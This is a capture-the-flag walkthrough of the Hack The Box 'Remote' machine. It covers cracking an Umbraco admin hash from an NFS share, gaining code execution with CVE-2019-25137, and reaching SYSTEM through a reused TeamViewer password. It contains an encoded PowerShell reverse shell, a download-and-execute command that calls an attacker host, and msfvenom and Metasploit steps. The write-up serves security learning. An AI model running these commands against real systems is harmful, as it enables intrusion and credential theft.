>[!tldr] Remote is an easy difficulty Windows machine that features an #Umbraco CMS installation. Credentials are found in a world-readable #NFS-share. Using these, an authenticated Umbraco CMS exploit is leveraged to gain a foothold. A vulnerable TeamViewer version is identified, from which we can gain a password. This password has been reused with the local administrator account. Using #psexec with these credentials returns a SYSTEM shell.


# Guided Mode
---
1. `What service runs on port 2049?`
	1. I decided  to scan this specific port with `nmap`
```shell
❯ nmap -sCV -p2049 10.129.230.172
<SNIP>
PORT     STATE SERVICE VERSION
2049/tcp open  mountd  1-3 (RPC #100005)

❯ nmap -sT -p- 10.129.230.172
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49678/tcp open  unknown
49679/tcp open  unknown
49680/tcp open  unknown
```

---
2. `Before we proceed enumerating other services, nmap reveals that anonymous login is allowed for FTP. How many files are available over anonymous FTP?`
	1. I opened FTP in the terminal with `ftp <ip>` and running `dir` retrieves nothing
- Flag #2 -> `0`

---
3. `On TCP port 80 we can see a web store. What is the name of the content management system (CMS) present on Remote?`
	1. Going to the website at the bottom it says `Umbraco HQ`
	2. You can also curl the website and see the `umbraco` css starterkit
- Flag #3 -> `umbraco`

---
4. `Since FTP yielded no results we shift our attention over to NFS shares. What is the name of the directory that is available on NFS? (Don't include a leading /)`
	1. I found the flag by using `showmount`. You can use `showmount -e <ip>` to find more information.
- Flag #4 -> `site_backups`

---
5. `After mounting the "site_backups" share we realize that an "Umbraco" directory exists inside it. Local installation files sometimes include sensitive information like passwords, usernames, e-mails, etc. What is the name of the file that includes the password for the "admin" user?`
	1. First we have to mount the drive then cd into it
```shell
❯ mkdir /tmp/HTB-remote && mount 10.129.230.172:/site_backups /tmp/HTB-remote
```
2. We then have to do enumeration in `Umbraco`, inside `App_Data/` is where our `Umbraco.sdf` sits, this is our target for passwords!
3. From the SDF we can `string` and `grep`, and i got this hash for admin
```shell
❯ strings Umbraco.sdf | grep -iE 'pass|user|admin|login|pwd' | head -40 
<SNIP>
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}
```
- Its all jarbled, but we can see right after "`admin@htb.local`" we see our hash
- Flag #5 ->  `b8be16afba8c314ad33d812f22a04991b90e2aaa`

---
6. `No clear-text passwords were available on that file. But, we managed to grab some password hashes. What is the clear text password of the "admin" user?`
- We need to take the hash from before and decrypt it, I will try with `hashcat`
```shell
❯ hashcat --identify 'b8be16afba8c314ad33d812f22a04991b90e2aaa'
<SNIP>
100 | SHA1
<SNIP>

❯ hashcat -a 0 -m 100 'b8be16afba8c314ad33d812f22a04991b90e2aaa' ~/Tools/SecLists-2026.1/Passwords/Leaked-Databases/rockyou.txt
```
- Hashcat barely got to run, but once it did we see the decrypted password
- Flag #6 -> `baconandcheese`

---
7. `What version of Umbraco is running on the remote machine?`
	1. Since we now have the user and password for the "admin" account we can use it
		1. `http://10.129.230.172/umbraco`
		2. `admin@htb.local`:`baconandcheese`
	2. From inside we can click on the "?" at the bottom and the version will be displayed
- Flag #7 -> `7.12.4`

---
- User Flag: `Submit the flag located on the public user's desktop.`
	- I found a cve for Umbraco version "7.12.4" -> `CVE-2019-25137`
	- The following is the exploit in a python script 
```shell
python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.129.230.172' -c powershell.exe -a '-NoProfile -Command ls'
```
- I wanted something better so i created a reverse shell
```shell
- Local Machine
  sudo nc -lvnp 443
  
- Target: Windows
  python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.129.230.172' \
  -c powershell.exe -a '-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AOQAwACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA='
```
- To Generate this blob i used `revshells.com` "PowerShell #3 (Base64)"
	- Local Machine now has access to the Windows target!
- After some enumeration I found `C:\Users\Public\Desktop\user.txt` which has the user flag
- User Flag -> `[REDACTED_FLAG]`

---
9. `After getting code execution on the system through a vulnerability in Umbraco, what non-default service is running on the system?`
	1. The best way to find services is to use `tasklist /svc`
```PowerShell
PS C:\Users\Public> tasklist /svc
<SNIP>
TeamViewer_Service.exe        2244 TeamViewer7
```
- TeamViewer is not a defualt service
- Flag #9 -> `TeamViewer7`

---
10. `Which 2019 CVE is related to this version of TeamViewer?`
	1. A quick google search found me this
- Flag #10 -> `CVE-2019-18988`

---
11. `What is the password that is extracted by exploiting the TeamViewer vulnerability?`
	1. First i started with checking CVEs POC, which led me to page showing it has a metasploit module. So i attempted to use `metasploit`
	2. **Note:** First, I need a meterpreter session so im going to make a reverse shell via metasploit instead of a normal shell
```shell
-Local Machine (setup msfconsole)
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp

-Local Machine (generate "s.exe" & setup HTTP server)
❯ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o s.exe
❯ python3 -m http.server 8000

-Local Machine (Use exploit from "CVE-2019-25137")
❯ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.129.230.172' -c powershell.exe -a "(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>:8000/s.exe',\$env:TEMP+'/s.exe'); Start-Process (\$env:TEMP+'/s.exe')
```

- Now we can use `CVE-2019-18988`
	- After `background` we get the session id which is needed for the exploit
```shell
meterpreter > background

❯ msfconsole -q
[*] Backgrounding session 2... # This is our background session number

msf exploit(multi/handler) > search cve:CVE-2019-18988
<SNIP>
0  post/windows/gather/credentials/teamviewer_passwords
<SNIP>
msf > use 0
msf > set SESSION 2
<SNIP>
[+] Found Unattended Password: !R3m0te!
<SNIP>
```
- We got *a* password!
- Flag #11 -> `!R3m0te!`

---
- Root Flag: `Submit the flag located on the administrator's desktop.`
	- `psexec.py administrator@10.129.230.172` -> Login with `!R3m0te!`
	- Since the program was slow i had to be clever 
```Powershell
C:\Windows\system32> cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop> type root.txt
[REDACTED_FLAG]
```
- Root Flag -> `[REDACTED_FLAG]`